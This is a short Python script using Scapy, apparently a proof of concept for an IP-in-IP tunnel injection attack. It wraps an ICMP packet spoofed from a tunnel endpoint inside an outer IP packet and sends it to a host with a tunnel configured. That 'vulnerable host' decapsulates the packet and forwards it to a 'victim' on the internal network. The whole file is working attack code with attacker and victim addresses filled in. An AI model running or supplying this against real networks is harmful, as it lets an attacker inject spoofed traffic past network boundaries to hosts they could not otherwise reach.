from scapy.layers.inet import *
from scapy.layers.inet6 import *
from scapy.packet import ls
from scapy.sendrecv import *


def construct_icmp_packet(src_ip, dst_ip): #Creates an inner packet, in this case an ICMP request
    packet = IP(dst=dst_ip, src=src_ip)/ICMP()
    return packet

def construct_ipip_packet(src_ip, dst_ip, inner_packet): #Encapsulates the inner packet in another IP packet, forming an IPIP encapsulation
    packet = IP(dst=dst_ip, src=src_ip)/inner_packet
    return packet





if __name__ == '__main__':
    attacker_ip = '192.168.1.2' #Your IP
    tunnel_interface = '192.168.2.2' #IP of attacked host, needs to have a tunnel configured
    tunnel_exit = '192.168.10.2' #IP of the attacked host, where tunnel traffic is directed to
    victim_ip = '192.168.10.3' #Victim in the tunneled network, where you want the tunneled traffic to be sent
    inner_packet = construct_icmp_packet(tunnel_exit,victim_ip) #Inner packet, that the vulnerable host decapsulates
    tunnel_packet = construct_ipip_packet(attacker_ip,tunnel_interface, inner_packet) #Encapsulated packet, that is sent to the tunnel interface
    tunnel_packet.display() #Good to know information, that the formed packet is correct
    send(tunnel_packet) #Encapsulated packet sent, we don't wait for a reply, since there won't be any